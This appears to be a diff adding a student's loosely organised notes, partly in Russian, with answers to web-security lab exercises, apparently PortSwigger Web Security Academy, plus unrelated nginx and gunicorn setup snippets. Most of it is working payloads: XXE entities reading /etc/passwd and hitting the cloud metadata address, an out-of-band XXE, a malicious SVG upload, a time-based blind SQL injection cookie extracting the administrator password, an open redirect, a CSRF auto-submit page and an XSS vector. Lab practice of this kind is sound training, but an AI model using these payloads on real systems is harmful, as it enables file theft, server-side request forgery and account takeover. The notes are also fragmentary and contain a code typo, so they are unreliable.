@@ -1,0 +1,130 @@
+5mf4|pdE9$|RS9'Li{+fP!e?34ac&}4a
+
+1 задание
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+
+2 задание
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/" > ]>
+
+3 задание
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+4 задание
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+
+Content-Disposition: form-data; name="avatar"; filename="123.svg"
+Content-Type: application/xml
+
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+64d2032906a5
+
+5 задание
+
+параметр stockid не пройдет
+
+6 задание
+
+<!DOCTYPE foo [ <!ENTITY %ent SYSTEM "http://burpcollaborator.net" > %ent;]>
+
+7 задание
+
+
+
+для SQLi
+
+GET / HTTP/1.1
+Host: acdd1f9d1efcf7528026d567006000a4.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acdd1f9d1efcf7528026d567006000a4.web-security-academy.net/login?err=LOGIN_FAILED
+Cookie: TrackingId=WUVOeRTEc3nZk8rE'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=fZhGMZLAtzMzOTBFECzxyAoM8rZPfRZe
+Upgrade-Insecure-Requests: 1
+
+
+
+
+https://ac831f761e5dc0d1803a9ee900bb0054.web-security-academy.net/post?postId=4&url=https://ac731f941ebbc07f80029e4a0190006f.web-security-academy.net/
+
+
+
+<html>
+  <body>
+    <form action="https://vulnerable-website.com/email/change" method="POST">
+      <input type="hidden" name="email" value="pwned@evil-user.net" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+OldgCxO3ZLWOrANOzCC2FvDn73nlUDOe
+
+
+Так же перевести можно с помощью Python следующим образом:
+1) Заменяем всё знаки "%" на "\x";
+2) Записываем полученную строку в байтовую переменную ( к примеру: S = b'\xD0...');
+3) Выполняем декодирование переменной с помощью метода S.decode('utf-8');
+4) На выходе получаем декодированный текст
+
+
+
+
+1) Reflected XSS - отображается только на определенной странице и не сработает, если жертва не перейдет по нужной ссылке(вредоносный скрипт исходит от текущего HTTP-запроса)
+Stored XSS - вредоносный скрипт сохраняется на сервере(в базе данных сайта) и подгружается с него, когда запрашивается отоброжение страницы
+DOM XSS - уязвимость на клиентской части, а не серверной. html не меняется, нужно просматривать DOM структуру
+
+2) <x onclick=alert(1) src=a></x>
+
+3) Потому что это атака)
+
+4) CSRF token
+   SameSite Cookies
+
+5)
+
+6)
+
+7) 1) поставлять данные только через плейсхолдеры
+   2) использовать white list
+
+
+
+
+   sudo /etc/init.d/nginx start
+
+   def wsgi(environ, start_response):
+	status = '200 OK'
+	headers = [('Content-Type', 'text/plain')]
+	data = environ['QUERY_STRING'].split('&')
+	out = '\n'.join(data).encode('utf-8')
+	start_responce(status, headers)
+	return [out]
+
+
+	location ^~ /hello/ {
+	    proxy_pass http://127.0.0.1:8080;
+	}
+
+	location / {
+	    proxy_pass http://127.0.0.1:8080;
+	}
+
+
+
+	gunicorn -b 0.0.0.0:8080 -c ~/web/hello.py hello:application
+
+
+	sudo ln -sf /home/box/web/etc/gunicorn.conf /etc/gunicorn.d/test
+sudo /etc/init.d/gunicorn restart
